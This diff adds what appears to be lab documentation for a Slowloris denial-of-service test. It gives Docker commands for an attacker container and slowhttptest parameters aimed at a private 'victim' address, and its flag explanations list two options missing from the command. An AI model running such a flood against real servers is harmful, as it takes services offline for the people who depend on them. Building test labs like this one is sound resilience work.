@@ -1,0 +1,14 @@
+docker build -t attacker-slowhttp .
+docker run -d --name attacker-slowhttp --network=host attacker-slowhttp
+
+## Parameters explanation : 
+["slowhttptest", "-c", "1000", "-H", "-i", "10", "-r", "200", "-t", "GET", "-u", "http://172.17.0.2"]
+
+-c 1000 → 1000 concurrent connections
+-H → Use Slowloris-style attack
+-g → Enable detailed statistics
+-o slowhttp → Output report as slowhttp.csv
+-i 10 → Send new requests every 10 seconds
+-r 200 → 200 requests per second
+-t GET → Use HTTP GET requests
+-u http://172.17.0.2 → Target the victim
